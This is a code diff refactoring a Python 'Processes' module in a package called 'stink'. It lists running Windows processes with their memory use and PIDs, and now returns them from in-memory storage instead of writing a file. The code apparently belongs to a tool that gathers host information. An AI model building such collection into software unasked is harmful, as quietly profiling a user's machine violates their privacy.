@@ -1,31 +1,19 @@
+from os import path
 from time import sleep
-from os import makedirs, path
+from typing import List
 from ctypes import windll, sizeof, byref
 
-from stink.helpers import functions
-from stink.helpers import ProcessEntry32, ProcessMemoryCountersEx
+from stink.helpers import functions, ProcessEntry32, ProcessMemoryCountersEx, MemoryStorage
 
 
 class Processes:
     """
     Collects all running processes.
     """
-    def __init__(self, storage_path: str, folder: str):
+    def __init__(self, folder: str):
 
-        self.__full_path = path.join(storage_path, folder)
-
-    def __create_folder(self) -> None:
-        """
-        Creates storage for the Processes module.
-
-        Parameters:
-        - None.
-
-        Returns:
-        - None.
-        """
-        if not path.exists(self.__full_path):
-            makedirs(self.__full_path, exist_ok=True)
+        self.__file = path.join(folder, "Processes.txt")
+        self.__storage = MemoryStorage()
 
     def __get_system_processes(self) -> None:
         """
@@ -64,12 +52,12 @@ class Processes:
                 kernel32.CloseHandle(process_handle)
                 sleep(0.00001)
 
-        with open(path.join(self.__full_path, "Processes.txt"), "a", newline="", encoding="utf-8") as processes:
-            processes.write("\n".join(line for line in functions.create_table(["Name", "Memory", "PID"], results)))
+        self.__storage.add_from_memory(
+            self.__file,
+            "\n".join(line for line in functions.create_table(["Name", "Memory", "PID"], results))
+        )
 
-        processes.close()
-
-    def run(self) -> None:
+    def run(self) -> List:
         """
         Launches the processes collection module.
 
@@ -81,8 +69,9 @@ class Processes:
         """
         try:
 
-            self.__create_folder()
             self.__get_system_processes()
+
+            return self.__storage.get_data()
 
         except Exception as e:
             print(f"[Processes]: {repr(e)}")
